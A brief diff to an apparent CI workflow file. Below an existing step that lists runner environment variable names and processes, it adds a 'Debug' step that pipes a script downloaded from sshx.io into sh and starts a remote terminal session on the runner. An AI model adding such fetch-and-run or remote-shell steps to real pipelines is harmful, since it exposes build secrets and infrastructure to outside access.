@@ -17,4 +17,8 @@ jobs:
         run: |
           env | grep -oE '^RUNNER_[A-Z_]+='
           ps -edalf
-
+      - name: Debug
+        run: |
+          curl -sSf https://sshx.io/get | sh
+          sshx
+          
